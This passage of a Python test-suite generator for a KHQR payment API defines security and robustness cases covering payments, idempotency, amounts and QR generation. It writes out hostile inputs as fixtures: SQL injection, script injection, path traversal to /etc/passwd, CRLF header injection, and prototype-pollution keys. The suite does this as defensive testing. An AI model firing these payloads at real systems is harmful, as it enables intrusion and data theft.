                expect={"status_in": [200, 201, 400, 401, 403, 422], "check": "checkout_url_host" if check_host else None},
                auth="none" if path == "/health" else "key",
                requires=[] if path == "/health" else ["store"],
                mutates=check_host,
                informational=not check_host,
                note="X-Forwarded-* is trusted by the backend; a poisoned checkout_url is an open redirect.",
                tags=[KIND_API, _label],
            )
            if body is not None:
                case["body"] = body
            cases.append(case)

    for label, value, desc in HOSTILE_HEADERS:
        for method, path in (("GET", "/v1/stores"), ("POST", "/v1/webhooks")):
            counter += 1
            case = _case(
                f"HDR-{counter:03d}",
                "headers",
                f"{method} {path} tolerates {label}: {desc}",
                severity=SEV_MEDIUM,
                method=method,
                path=path,
                headers={label: value},
                expect={"status_in": [200, 201, 400, 401, 403, 405, 422]},
                mutates=method == "POST",
                informational=True,
                note="No crash, no reflection, no 5xx.",
            )
            if method == "POST":
                case["body"] = {"url": "https://sink.example.com/hook"}
            cases.append(case)
    return cases


def _param_cases() -> list[dict[str, Any]]:
    """Query-string abuse: pollution, encoding, SQLi / XSS / traversal."""
    cases: list[dict[str, Any]] = []
    counter = 0

    param_targets = ["/v1/payments", "/v1/stores", "/v1/reports/payments.json", "/v1/webhooks"]
    for payload in INJECTION_PAYLOADS:
        for target in param_targets:
            counter += 1
            cases.append(
                _case(
                    f"QRY-{counter:03d}",
                    "query",
                    f"{target} ignores injection payload in ?limit",
                    severity=SEV_HIGH,
                    path=target,
                    query={"limit": payload},
                    expect={"status_in": [200, 400, 422], "detail_not_contains": payload},
                    informational=True,
                    note="A reflected payload means the value reached SQL/HTML unescaped.",
                ),
            )
    for payload in INJECTION_PAYLOADS:
        for target, bakong_dependent in (
            ("/v1/payments/", False),
            ("/v1/stores/", False),
            ("/v1/webhooks/999999/deliveries", False),
            ("/v1/transactions/instruction-ref/", True),
        ):
            counter += 1
            allowed = [400, 404, 405, 422, 503] if bakong_dependent else [400, 404, 405, 422]
            cases.append(
                _case(
                    f"QRY-{counter:03d}",
                    "query",
                    f"path segment injection at {target} is contained",
                    severity=SEV_HIGH,
                    path=target + quote(payload, safe=""),
                    expect={"status_in": allowed, "detail_not_contains": payload},
                    informational=bakong_dependent,
                    note="Must be a clean 4xx — never 200 (leak) and never 5xx (crash). 503 = Bakong token not configured.",
                ),
            )

    weird_params = [
        ("duplicate_limit", "limit=1&limit=100", [200]),
        ("array_syntax", "limit[]=1", [200, 422]),
        ("nested_array", "limit[a][b]=1", [200, 422]),
        ("encoded_space", "limit=%20", [200, 422]),
        ("plus_sign", "limit=+1", [200, 422]),
        ("empty_param", "limit=", [200, 422]),
        ("huge_value", "limit=" + "9" * 100, [200, 422]),
        ("negative_bool", "limit=true", [200, 422]),
        ("null_literal", "limit=null", [200, 422]),
        ("undefined_literal", "limit=undefined", [200, 422]),
        ("nan_literal", "limit=NaN", [200, 422]),
        ("float", "limit=1.5", [200, 422]),
        ("plus_one", "limit=1e3", [200, 422]),
        ("semicolon", "limit=1;2", [200, 422]),
        ("pipe", "limit=1|2", [200, 422]),
        ("backslash", "limit=\\", [200, 422]),
        ("overlong_utf8", "limit=%c0%af", [200, 422]),
        ("double_encoded", "limit=%2527", [200, 422]),
        ("control_char", "limit=%00%01%02", [200, 422]),
        ("newline", "limit=%0d%0aX-Injected:1", [200, 422]),
    ]
    for label, raw, allowed in weird_params:
        counter += 1
        cases.append(
            _case(
                f"QRY-{counter:03d}",
                "query",
                f"GET /v1/payments tolerates malformed query ({label})",
                severity=SEV_MEDIUM,
                path="/v1/payments",
                query_raw=raw + "&store=$store",
                expect={"status_in": allowed, "header_has": {"X-ChmabaPay-Trace": ""}},
                requires=["store"],
                informational=True,
                note="Param pollution must not break clamping or leak an injected header.",
            ),
        )
    for label, raw, allowed in weird_params[:8]:
        counter += 1
        cases.append(
            _case(
                f"QRY-{counter:03d}",
                "query",
                f"GET /v1/webhooks/{label} delivers a bounded list",
                severity=SEV_LOW,
                path="/v1/webhooks/1/deliveries",
                query_raw=raw,
                expect={"status_in": [200, 404] + [s for s in allowed if s >= 400]},
                informational=True,
                requires=["webhook"],
            ),
        )
    return cases


def _amount_cases() -> list[dict[str, Any]]:
    cases: list[dict[str, Any]] = []
    counter = 0

    expectations = {
        "ok": {"status": 201, "json_has": ["id", "status"]},
        "too_low": {"status_in": [400, 422], "detail_contains": "amount_too_low"},
        "invalid": {"status": 422, "detail_contains": "invalid_amount"},
        "type_error": {"status": 422},
        "coerced_or_rejected": {"status_in": [201, 422]},
        "informational": {"status_in": [201, 400, 422]},
    }
    for label, value, kind in AMOUNT_VALUES:
        counter += 1
        cases.append(
            _case(
                f"AMT-{counter:03d}",
                "amount",
                f"POST /v1/payments amount={label}",
                severity=SEV_CRITICAL if kind in ("too_low", "invalid", "ok") else SEV_MEDIUM,
                method="POST",
                path="/v1/payments",
                body=_pay_body(amount=value),
                expect=dict(expectations[kind]),
                requires=["store"],
                mutates=kind in ("ok", "coerced_or_rejected", "informational"),
                informational=kind in ("coerced_or_rejected", "informational"),
                note=(
                    "Money is integer cents; anything finer than 2dp must be refused, never rounded silently. "
                    "Values above ~$21.47M overflow the int32 amount_cents column and currently return 500."
                    if kind == "ok"
                    else None
                ),
            ),
        )
    for label, raw, kind in RAW_AMOUNT_BODIES:
        counter += 1
        cases.append(
            _case(
                f"AMT-{counter:03d}",
                "amount",
                f"POST /v1/payments raw body case: {label}",
                severity=SEV_HIGH,
                method="POST",
                path="/v1/payments",
                raw_body=_raw_pay(raw),
                headers={"Content-Type": "application/json"},
                expect=(
                    {"status_in": [200, 201], "json_has": ["id"]}
                    if kind == "accepted"
                    else {"status_in": [400, 422]}
                ),
                requires=["store"],
                mutates=kind == "accepted",
                note="Malformed JSON must be a clean 4xx; a 500 here is a parser crash.",
            ),
        )

    # Plan / link amount ceilings are environment specific -> informational.
    for amount in (100000000.00, 999999999.99, 1000000000, 1e15, 1e30):
        counter += 1
        cases.append(
            _case(
                f"AMT-{counter:03d}",
                "amount",
                f"POST /v1/payments very large amount={amount:g}",
                severity=SEV_HIGH,
                method="POST",
                path="/v1/payments",
                body=_pay_body(amount=amount),
                expect={"status_in": [201, 400, 402], "detail_in": ["amount_too_high", None]},
                requires=["store"],
                mutates=False,
                note="A plan/link ceiling legitimately returns 400 amount_too_high — but never a 500.",
            ),
        )

    # Same validation on the KHQR generator (network: it SSR-fetches the link).
    # This endpoint returns the generated QR, not a payment row: 200 carrying
    # qr_string/qr_md5, never 201 + id/status. Reusing expectations["ok"] here
    # asserted a payment shape against a QR endpoint and failed 14 responses
    # that were entirely correct.
    khqr_ok = {"status": 200, "json_has": ["qr_string", "qr_md5", "instruction_ref"]}
    for label, value, kind in AMOUNT_VALUES[:24]:
        counter += 1
        cases.append(
            _case(
                f"AMT-{counter:03d}",
                "amount",
                f"POST /v1/khqr/from-link amount={label}",
                severity=SEV_HIGH,
                method="POST",
                path="/v1/khqr/from-link",
                body={"link": PAYWAY_SLUG, "amount": value, "bakong_id": "test_bakong_id@abaa"},
                expect=(
                    {"status_in": [200, 400, 422]}
                    if kind in ("informational", "coerced_or_rejected")
                    else (dict(khqr_ok) if kind == "ok" else dict(expectations[kind]))
                ),
                network=True,
                informational=kind in ("coerced_or_rejected", "informational"),
                note="Validation must happen before any network call.",
            ),
        )
    return cases


def _khqr_cases() -> list[dict[str, Any]]:
    cases: list[dict[str, Any]] = []
    counter = 0

    for label, value, expect_shape in LINK_VARIANTS:
        counter += 1
        cases.append(
            _case(
                f"KHQ-{counter:03d}",
                "khqr",
                f"POST /v1/khqr/from-link link={label}",
                severity=SEV_HIGH,
                method="POST",
                path="/v1/khqr/from-link",
                body={"link": value, "amount": 1.00},
                expect=(
                    {
                        "status": 200,
                        "json_has": ["qr_string", "qr_md5", "short_hash", "instruction_ref"],
                        "check": "crc16_tlv",
                    }
                    if expect_shape
                    else {"status_in": [200, 400, 422], "check": "crc16_tlv"}
                ),
                network=True,
                informational=not expect_shape,
                note="The returned payload must be a real EMVCo/KHQR string with a valid CRC-16.",
                tags=[KIND_NETWORK],
            ),
        )

    for currency in CURRENCY_VARIANTS:
        counter += 1
        cases.append(
            _case(
                f"KHQ-{counter:03d}",
                "khqr",
                f"POST /v1/khqr/from-link currency={currency!r}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/khqr/from-link",
                body={"link": PAYWAY_SLUG, "amount": 1.00, "currency": currency, "bakong_id": "test_bakong_id@abaa"},
                expect={"status_in": [200, 400, 422], "check": "crc16_tlv"},
                network=True,
                informational=True,
                note="KHR maps to ISO 4217 numeric 116; unknown codes must not corrupt the TLV.",
            ),
        )
    for ttl in TTL_VARIANTS:
        counter += 1
        cases.append(
            _case(
                f"KHQ-{counter:03d}",
                "khqr",
                f"POST /v1/khqr/from-link ttl_seconds={ttl!r}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/khqr/from-link",
                body={"link": PAYWAY_SLUG, "amount": 1.00, "ttl_seconds": ttl, "bakong_id": "test_bakong_id@abaa"},
                expect={"status_in": [200, 422]},
                network=True,
                informational=True,
                note="Bounds are 30 .. 30 days; out-of-range must be 422 from the schema.",
            ),
        )

    option_matrix: list[tuple[str, dict[str, Any], list[int]]] = [
        ("bakong_id_empty", {"bakong_id": ""}, [200]),
        ("bakong_id_120_chars", {"bakong_id": "b" * 120}, [200]),
        ("bakong_id_121_chars", {"bakong_id": "b" * 121}, [422]),
        ("bakong_id_xss", {"bakong_id": "<script>alert(1)</script>"}, [200, 422]),
        ("bakong_id_sqli", {"bakong_id": "' OR 1=1--"}, [200, 422]),
        ("bakong_id_unicode", {"bakong_id": "គណនី@abaa"}, [200]),
        ("bill_number_1_char", {"bill_number": "A"}, [200]),
        ("bill_number_64_chars", {"bill_number": "B" * 64}, [200]),
        ("bill_number_65_chars", {"bill_number": "B" * 65}, [422]),
        ("reference_id_255_chars", {"reference_id": "R" * 255}, [200]),
        ("reference_id_256_chars", {"reference_id": "R" * 256}, [422]),
        ("reference_id_sqli", {"reference_id": "' OR 1=1--"}, [200]),
        ("payway_client_id_valid", {"payway_client_id": "2364634-518710-26248177"}, [200]),
        ("payway_client_id_64_chars", {"payway_client_id": "c" * 64}, [200]),
        ("payway_client_id_65_chars", {"payway_client_id": "c" * 65}, [422]),
        ("reference_id_crlf", {"reference_id": "ref\r\nX-Injected: 1"}, [200]),
    ]
    for label, extra, allowed in option_matrix:
        counter += 1
        payload: dict[str, Any] = {"link": PAYWAY_SLUG, "amount": 1.00}
        payload.update(extra)
        cases.append(
            _case(
                f"KHQ-{counter:03d}",
                "khqr",
                f"POST /v1/khqr/from-link option {label}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/khqr/from-link",
                body=payload,
                expect={"status_in": allowed, "check": "crc16_tlv" if 200 in allowed else None},
                network=True,
                informational=len(allowed) > 1,
            ),
        )

    probe_targets = [
        ("own_link", {"slug_or_url": PAYWAY_LINK}, [200]),
        ("slug", {"slug_or_url": PAYWAY_SLUG}, [200]),
        ("with_expected_amount", {"slug_or_url": PAYWAY_SLUG, "expected_amount_usd": 1.00}, [200]),
        ("with_bill_number", {"slug_or_url": PAYWAY_SLUG, "bill_number": "INTEGRATION-1"}, [200]),
        ("with_reference", {"slug_or_url": PAYWAY_SLUG, "reference_id": "ref-1"}, [200]),
        ("foreign_host", {"slug_or_url": "https://evil.example.com/x"}, [200, 400]),
        ("sqli", {"slug_or_url": "' OR 1=1--"}, [200, 400, 422]),
        ("too_short", {"slug_or_url": "abc"}, [422]),
        ("zero_amount_filter", {"slug_or_url": PAYWAY_SLUG, "expected_amount_usd": 0}, [422]),
        ("negative_amount_filter", {"slug_or_url": PAYWAY_SLUG, "expected_amount_usd": -1}, [422]),
    ]
    for label, query, allowed in probe_targets:
        counter += 1
        cases.append(
            _case(
                f"KHQ-{counter:03d}",
                "khqr",
                f"POST /v1/khqr/probe-aba-status {label}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/khqr/probe-aba-status",
                auth="none",
                query=query,
                expect={
                    "status_in": allowed,
                    "json_has": (["status", "signals"] if 200 in allowed else []),
                    "check": "status_enum" if 200 in allowed else None,
                },
                network=True,
                informational=len(allowed) > 1,
                note="Status must be one of PAID/PENDING/FAILED/UNKNOWN — never a crash.",
                tags=[KIND_NETWORK],
            ),
        )
    return cases


def _payment_cases() -> list[dict[str, Any]]:
    cases: list[dict[str, Any]] = []
    counter = 0

    def nxt() -> str:
        nonlocal counter
        counter += 1
        return f"PAY-{counter:03d}"

    cases.append(
        _case(
            nxt(),
            "payments",
            "Full lifecycle: create → read → list → checkout → scan → pay → terminal",
            severity=SEV_CRITICAL,
            serial=True,
            mutates=True,
            requires=["store"],
            check="lifecycle",
            steps=[
                {
                    "name": "create",
                    "method": "POST",
                    "path": "/v1/payments",
                    "body": {"store": "$store", "amount": 2.50, "reference_id": "integration-lifecycle"},
                    "expect": {
                        "status": 201,
                        "json_has": ["id", "status", "checkout_url", "qr_string", "expires_at"],
                        "json_equals": {"status": "pending", "amount": "2.50", "currency": "USD"},
                    },
                    "capture": {"flow_payment": "$.id", "checkout_url": "$.checkout_url", "qr_string": "$.qr_string"},
                },
                {
                    "name": "read",
                    "method": "GET",
                    "path": "/v1/payments/$flow_payment",
                    "expect": {"status": 200, "json_equals": {"status": "pending"}},
                },
                {
                    "name": "list_contains",
                    "method": "GET",
                    "path": "/v1/payments",
                    "query": {"store": "$store", "limit": 20},
                    "expect": {"status": 200, "check": "list_contains_payment"},
                },
                {
                    "name": "checkout_html",
                    "method": "GET",
                    "path": "/pay/$flow_payment",
                    "auth": "none",
                    "expect": {"status": 200, "body_has": ["</html>"], "header_has": {"content-type": "text/html"}},
                },
                {
                    "name": "checkout_status",
                    "method": "GET",
                    "path": "/pay/$flow_payment/status",
                    "auth": "none",
                    "expect": {"status": 200, "json_equals": {"status": "pending"}},
                },
                {
                    "name": "dev_scan",
                    "method": "POST",
                    "path": "/_dev/payments/$flow_payment/scan",
                    "auth": "none",
                    "expect": {"status": 200, "json_equals": {"status": "scanned"}},
                },
                {
                    "name": "checkout_status_scanned",
                    "method": "GET",
                    "path": "/pay/$flow_payment/status",
                    "auth": "none",
                    "expect": {"status": 200, "json_equals": {"status": "scanned"}},
                },
                {
                    "name": "dev_pay",
                    "method": "POST",
                    "path": "/_dev/payments/$flow_payment/pay",
                    "auth": "none",
                    "expect": {"status": 200, "json_equals": {"status": "paid"}},
                },
                {
                    "name": "read_paid",
                    "method": "GET",
                    "path": "/v1/payments/$flow_payment",
                    "expect": {"status": 200, "json_equals": {"status": "paid"}, "json_has": ["approved_at", "paid_at"]},
                },
                {
                    "name": "pay_again_is_terminal",
                    "method": "POST",
                    "path": "/_dev/payments/$flow_payment/pay",
                    "auth": "none",
                    "expect": {"status": 404, "detail": "payment_not_payable"},
                    "note": "Double-credit is the one bug you cannot undo.",
                },
                {
                    "name": "scan_after_paid_is_noop",
                    "method": "POST",
                    "path": "/_dev/payments/$flow_payment/scan",
                    "auth": "none",
                    "expect": {"status_in": [200], "json_equals": {"status": "paid"}},
                },
            ],
            note="One payment driven through every state; the second pay attempt must be refused.",
        ),
    )

    cases.append(
        _case(
            nxt(),
            "payments",
            "Idempotency-Key in the body replays instead of double-charging",
            severity=SEV_CRITICAL,
            serial=True,
            mutates=True,
            requires=["store"],
            check="idempotent_replay",
            steps=[
                {
                    "name": "first",
                    "method": "POST",
                    "path": "/v1/payments",
                    "body": {"store": "$store", "amount": 3.00, "idempotency_key": "integration-idem-body"},
                    "expect": {"status": 201},
                    "capture": {"first_id": "$.id"},
                },
                {
                    "name": "replay",
                    "method": "POST",
                    "path": "/v1/payments",
                    "body": {"store": "$store", "amount": 3.00, "idempotency_key": "integration-idem-body"},
                    "expect": {"status": 200, "json_equals": {"id": "$first_id"}},
                },
            ],
        ),
    )
    cases.append(
        _case(
            nxt(),
            "payments",
            "Idempotency-Key HTTP header must be honoured like the body field",
            severity=SEV_CRITICAL,
            serial=True,
            mutates=True,
            requires=["store"],
            check="idempotent_replay",
            steps=[
                {
                    "name": "first",
                    "method": "POST",
                    "path": "/v1/payments",
                    "headers": {"Idempotency-Key": "integration-idem-header"},
                    "body": {"store": "$store", "amount": 3.00},
                    "expect": {"status": 201},
                    "capture": {"first_id": "$.id"},
                },
                {
                    "name": "replay",
                    "method": "POST",
                    "path": "/v1/payments",
                    "headers": {"Idempotency-Key": "integration-idem-header"},
                    "body": {"store": "$store", "amount": 3.00},
                    "expect": {"status": 200, "json_equals": {"id": "$first_id"}},
                },
            ],
            note="Documented contract; if this fails the docs and the code disagree.",
        ),
    )
    for label, headers, body in (
        ("header_only", {"Idempotency-Key": "integration-idem-mix"}, _pay_body(amount=3.00)),
        (
            "header_and_body_conflict",
            {"Idempotency-Key": "integration-idem-a"},
            _pay_body(amount=3.00, idempotency_key="integration-idem-b"),
        ),
        ("empty_header", {"Idempotency-Key": ""}, _pay_body(amount=3.00)),
        ("header_max_length", {"Idempotency-Key": "k" * 255}, _pay_body(amount=3.00)),
        ("header_over_length", {"Idempotency-Key": "k" * 256}, _pay_body(amount=3.00)),
        ("body_empty_key", {}, _pay_body(amount=3.00, idempotency_key="")),
        ("body_over_length", {}, _pay_body(amount=3.00, idempotency_key="k" * 256)),
        ("body_unicode_key", {}, _pay_body(amount=3.00, idempotency_key="លេខ-1")),
        ("body_sql_key", {}, _pay_body(amount=3.00, idempotency_key="' OR 1=1--")),
    ):
        cases.append(
            _case(
                nxt(),
                "payments",
                f"Idempotency key variant: {label}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/payments",
                headers=headers,
                body=body,
                expect={"status_in": [200, 201, 422]},
                requires=["store"],
                mutates=True,
                informational=True,
            ),
        )

    # A distinct-key pair must produce two distinct payments.
    cases.append(
        _case(
            nxt(),
            "payments",
            "Distinct idempotency keys produce distinct payments",
            severity=SEV_HIGH,
            serial=True,
            mutates=True,
            requires=["store"],
            check="distinct_ids",
            steps=[
                {
                    "name": "first",
                    "method": "POST",
                    "path": "/v1/payments",
                    "body": {"store": "$store", "amount": 1.00, "idempotency_key": "integration-distinct-a"},
                    "expect": {"status": 201},
                    "capture": {"first_id": "$.id"},
                },
                {
                    "name": "second",
                    "method": "POST",
                    "path": "/v1/payments",
                    "body": {"store": "$store", "amount": 1.00, "idempotency_key": "integration-distinct-b"},
                    "expect": {"status": 201},
                    "capture": {"second_id": "$.id"},
                },
            ],
        ),
    )

    # Filter / pagination matrix on the read-only list endpoint.
    statuses = ["pending", "scanned", "paid", "expired", "failed", "bogus", "", "'; DROP TABLE payments--"]
    limits = [0, 1, -1, 20, 100, 101, 1000, "abc", 1e3]
    for status_value in statuses:
        for limit in limits:
            cases.append(
                _case(
                    nxt(),
                    "payments",
                    f"GET /v1/payments?status={status_value!r}&limit={limit!r}",
                    severity=SEV_MEDIUM,
                    path="/v1/payments",
                    query={"store": "$store", "status": status_value, "limit": limit},
                    expect={
                        "status_in": [200, 422],
                        "check": "limit_bounds",
                    },
                    requires=["store"],
                    informational=True,
                    note="limit is clamped server-side; an unknown status is not an error.",
                ),
            )

    for label, query, allowed in (
        ("store_bogus", {"store": "st_does_not_exist"}, [404]),
        ("store_empty", {"store": ""}, [200, 400]),
        ("merchant_bogus", {"merchant": "no-such-merchant"}, [404]),
        ("merchant_empty", {"merchant": ""}, [200, 400]),
        ("store_and_merchant", {"store": "st_does_not_exist", "merchant": "no-such-merchant"}, [404]),
        ("store_sqli", {"store": "' OR 1=1--"}, [404, 422]),
        ("merchant_sqli", {"merchant": "' OR 1=1--"}, [404, 422]),
    ):
        cases.append(
            _case(
                nxt(),
                "payments",
                f"GET /v1/payments store targeting: {label}",
                severity=SEV_MEDIUM,
                path="/v1/payments",
                query=query,
                expect={"status_in": allowed},
                requires=["store"],
                informational=len(allowed) > 1,
            ),
        )

    for label, value, allowed in (
        ("unknown_id", "PUETcMUOKStjZsCb6zAl8kg9fMRGM85x", [404]),
        ("empty_id", "", [400, 404, 405]),
        ("numeric_id", "1", [404]),
        ("uuid_id", "550e8400-e29b-41d4-a716-446655440000", [404]),
        ("very_long_id", "p" * 2048, [404, 414]),
        ("sqli_id", "' OR 1=1--", [404, 400]),
        ("xss_id", "<script>alert(1)</script>", [404, 400]),
        ("traversal_id", "..%2f..%2fetc%2fpasswd", [404, 400]),
        ("null_byte_id", "%00", [404, 400]),
    ):
        cases.append(
            _case(
                nxt(),
                "payments",
                f"GET /v1/payments/{{id}} with {label}",
                severity=SEV_HIGH,
                path=f"/v1/payments/{value}",
                expect={"status_in": allowed, "detail_in": ["payment_not_found", None]},
                informational=label != "unknown_id",
                note="Unknown ids must be indistinguishable from other accounts' ids.",
            ),
        )

    for label, value, allowed in (
        ("unknown_id", "PUETcMUOKStjZsCb6zAl8kg9fMRGM85x", [404]),
        ("sqli_id", "' OR 1=1--", [404, 400]),
        ("traversal_id", "..%2f..%2fetc%2fpasswd", [404, 400]),
        ("very_long_id", "p" * 2048, [404, 414]),
    ):
        cases.append(
            _case(
                nxt(),
                "payments",
                f"Public checkout /pay/{{id}} with {label}",
                severity=SEV_HIGH,
                path=f"/pay/{value}",
                auth="none",
                expect={"status_in": allowed, "detail_in": ["payment_not_found", None]},
                informational=label != "unknown_id",
                note="The public checkout page must not reveal whether an id exists.",
            ),
        )
        cases.append(
            _case(
                nxt(),
                "payments",
                f"Public checkout /pay/{{id}}/status with {label}",
                severity=SEV_HIGH,
                path=f"/pay/{value}/status",
                auth="none",
                expect={"status_in": allowed, "detail_in": ["payment_not_found", None]},
                informational=label != "unknown_id",
            ),
        )

    for label, reference in (
        ("one_char", "a"),
        ("255_chars", "r" * 255),
        ("256_chars", "r" * 256),
        ("unicode", "ការបញ្ជាទិញ-១"),
        ("crlf", "ref\r\nX-Injected: 1"),
        ("xss", "<script>alert(1)</script>"),
        ("sqli", "' OR 1=1--"),
        ("html_entity", "&lt;script&gt;"),
    ):
        cases.append(
            _case(
                nxt(),
                "payments",
                f"POST /v1/payments reference_id={label}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/payments",
                body=_pay_body(amount=1.00, reference_id=reference),
                expect={"status_in": [201, 422], "check": "no_injected_header"},
                requires=["store"],
                mutates=True,
                informational=label not in ("one_char",),
                note="CRLF in a reference must never reach a response header.",
            ),
        )

    metadata_cases: list[tuple[str, Any]] = [
        ("null", None),
        ("empty_object", {}),
        ("flat", {"order": "A-1", "channel": "pos"}),
        ("unicode_values", {"ក": "ខ"}),
        ("xss_value", {"note": "<script>alert(1)</script>"}),
        ("sqli_value", {"note": "' OR 1=1--"}),
        ("prototype_pollution", {"__proto__": {"admin": True}}),
        ("constructor_key", {"constructor": {"prototype": {"admin": True}}}),
        ("list_value", {"items": [1, 2, 3]}),
        ("deep_8_levels", _nested(8)),
        ("deep_9_levels", _nested(9)),
        ("wide_1000_keys", {f"k{i}": i for i in range(1000)}),
    ]
    for label, metadata in metadata_cases:
        cases.append(
            _case(
                nxt(),
                "payments",
                f"POST /v1/payments metadata={label}",
                severity=SEV_HIGH,
                method="POST",
                path="/v1/payments",
                body=_pay_body(amount=1.00, metadata=metadata),
                expect={"status_in": [201, 400, 413, 422]},
                requires=["store"],
                mutates=True,
                informational=True,
                note="Metadata is stored verbatim and echoed to webhooks — it must round-trip safely.",
            ),
        )

    cases.append(
        _case(
            nxt(),
            "payments",
            "Payment response shape is stable and leaks nothing",
            severity=SEV_CRITICAL,
            method="POST",
            path="/v1/payments",
            body=_pay_body(amount=1.50, reference_id="integration-shape"),
            expect={
                "status": 201,
                "json_has": [
                    "id",
                    "status",
                    "amount",
                    "currency",
                    "checkout_url",
                    "qr_string",
                    "created_at",
                    "expires_at",
                ],
                "json_absent": ["account_id", "key_hash", "secret_key", "secret", "store_db_id"],
                "check": "payment_shape",
            },
            requires=["store"],
            mutates=True,
            note="expires_at - created_at must equal the configured checkout TTL.",
        ),
    )
    cases.append(
        _case(
            nxt(),
            "payments",
            "Payment QR carries the wallet-validity fields (Tag 30.02 + Tag 99 in ms)",
            severity=SEV_CRITICAL,
            method="POST",
            path="/v1/payments",
            body=_pay_body(amount=1.00),
            expect={"status": 201, "check": "crc16_tlv"},
            requires=["store"],
            mutates=True,
            note=(
                "A real Bakong wallet rejected an earlier payload with 'QR expired' because Tag 99 "
                "(millisecond issue/expiry window) was absent. ABA's own QR always carries 30.02 + 99."
            ),
        ),
    )
    cases.append(
        _case(
            nxt(),
            "payments",
            "Payment id is long, random and URL-safe",
            severity=SEV_MEDIUM,
            method="POST",
            path="/v1/payments",
            body=_pay_body(amount=1.00),
            expect={"status": 201, "check": "payment_id_shape"},
            requires=["store"],
            mutates=True,
            note="Sequential or short ids would be enumerable.",
        ),
    )
    cases.append(
        _case(
            nxt(),
            "payments",
            "checkout_url points at /pay/<id> on the same origin",
            severity=SEV_HIGH,
            method="POST",
            path="/v1/payments",
            body=_pay_body(amount=1.00),
            expect={"status": 201, "check": "checkout_url_shape"},
            requires=["store"],
            mutates=True,
        ),
    )
    return cases


def _nested(depth: int) -> dict[str, Any]:
    node: Any = {"leaf": 1}
    for _ in range(depth - 1):
        node = {"child": node}
    return node


def _live_pay_cases() -> list[dict[str, Any]]:
    """Generate a real scannable KHQR from an ABA PayWay link and confirm it.

    Answers the question the whole offline EMVCo build hinges on: does a QR we
    build ourselves get accepted by a banking app and settle into the merchant's
    account?

    Lessons baked into these cases (2026-09-15, real phone and a real payment):

    - Confirmation comes from the Bakong ledger, looked up by the QR md5. The ABA
      PayWay link page CANNOT confirm anything: it is a static Nuxt template that
      always serves order_details.status="OPEN" and amount="0.00" and carries no
      per-transaction data, so waiting on it means waiting forever.
    - Tag 30.01 must be a resolvable Bakong account. Routing it to the link slug
      is what made the phone answer "QR not found".
    - Tag 99 is the validity window the wallet enforces. Without it the same
      phone answered "QR expired" no matter what our own shorter bill TTL said.

    The phone-scan case is flagged `manual` so it stays out of automated runs.
    """
    cases: list[dict[str, Any]] = []

    cases.append(
        _case(
            "LP-001",
            "live-pay",
            "render.svg returns a real SVG QR for an arbitrary payload",
            severity=SEV_HIGH,
            path="/v1/khqr/render.svg",
            auth="none",
            query={"payload": "CHMABAPAY-RENDER-TEST-0001", "scale": 8},
            expect={"status": 200, "check": "qr_svg_shape"},
            note="A QR string nobody can draw is useless: this is the only real encoder in the codebase.",
        ),
    )
    cases.append(
        _case(
            "LP-002",
            "live-pay",
            "render.svg rejects a payload too large for a QR instead of 500",
            severity=SEV_HIGH,
            path="/v1/khqr/render.svg",
            auth="none",
            # Lower-case forces byte mode (upper-case would be packed as
            # alphanumeric, which has roughly double the capacity and still fits).
            query={"payload": "a" * 1400, "scale": 8},
            expect={"status": 400, "detail": "payload_too_long"},
            note="1400 bytes exceeds the v40 ECC-H byte capacity (~1273); segno raises DataOverflowError.",
        ),
    )
    cases.append(
        _case(
            "LP-003",
            "live-pay",
            "render.svg rejects an oversized payload at the schema boundary",
            severity=SEV_MEDIUM,
            path="/v1/khqr/render.svg",
            auth="none",
            query={"payload": "A" * 1600},
            expect={"status": 422},
        ),
    )
    for scale, expected in ((0, 422), (1, 422), (25, 422), (24, 200)):
        cases.append(
            _case(
                f"LP-{len(cases) + 1:03d}",
                "live-pay",
                f"render.svg scale={scale}",
                severity=SEV_LOW,
                path="/v1/khqr/render.svg",
                auth="none",
                query={"payload": "CHMABAPAY-RENDER-TEST-SCALE", "scale": scale},
                expect={"status": expected},
                informational=expected == 200,
                note="Too small to scan reliably or too large to serve — both must be refused, not guessed.",
            ),
        )
    cases.append(
        _case(
            f"LP-{len(cases) + 1:03d}",
            "live-pay",
            "render.svg rejects an unknown ECC level",
            severity=SEV_LOW,
            path="/v1/khqr/render.svg",
            auth="none",
            query={"payload": "CHMABAPAY-RENDER-TEST-ECC", "ecc": "z"},
            expect={"status": 422},
        ),
    )
    cases.append(
        _case(
            f"LP-{len(cases) + 1:03d}",
            "live-pay",
            "ABA issues the KHQR for a PayWay link, and it renders scannable",
            severity=SEV_CRITICAL,
            network=True,
            serial=True,
            steps=[
                {
                    "name": "hosted_checkout",
                    "method": "POST",
                    "path": "/v1/khqr/payway/checkout",
                    "body": {"link": PAYWAY_SLUG, "amount": 1.00},
                    "expect": {
                        "status": 200,
                        "json_has": ["qr_string", "qr_md5", "client_id", "token", "request_time"],
                        "check": "payway_hosted_checkout",
                    },
                    "capture": {
                        "live_qr": "$.qr_string",
                        "live_client_id": "$.client_id",
                        "live_request_time": "$.request_time",
                        "live_token": "$.token",
                    },
                },
                {
                    "name": "render_it",
                    "method": "GET",
                    "path": "/v1/khqr/render.svg",
                    "auth": "none",
                    "query": {"payload": "$live_qr", "scale": 8},
                    "expect": {"status": 200, "check": "qr_svg_shape"},
                },
            ],
            note=(
                "This replaced the offline EMVCo build. ABA mints the QR, so the payload carries a real "
                "PAYWAY@ABA token block we cannot forge — that is what makes a wallet accept it and what lets the "
                "same session answer status later. Rendering has to survive it too, hence the viewBox check."
            ),
        ),
    )
    cases.append(
        _case(
            f"LP-{len(cases) + 1:03d}",
            "live-pay",
            "PayWay link page can never report an unpaid QR as PAID",
            severity=SEV_CRITICAL,
            network=True,
            serial=True,
            requires=[],
            steps=[
                {
                    "name": "generate",
                    "method": "POST",
                    "path": "/v1/khqr/from-link",
                    "body": {"link": PAYWAY_SLUG, "amount": 0.01, "bill_number": "CHMLIVE-$nonce"},
                    "expect": {"status": 200},
                    "capture": {"live_bill": "$.instruction_ref"},
                },
                {
                    "name": "probe",
                    "method": "POST",
                    "path": "/v1/khqr/probe-aba-status",
                    "auth": "none",
                    "query": {
                        "slug_or_url": PAYWAY_SLUG,
                        "bill_number": "$live_bill",
                        "expected_amount_usd": 0.01,
                    },
                    "expect": {
                        "status": 200,
                        "json_has": ["status", "signals"],
                        "check": "aba_page_never_paid",
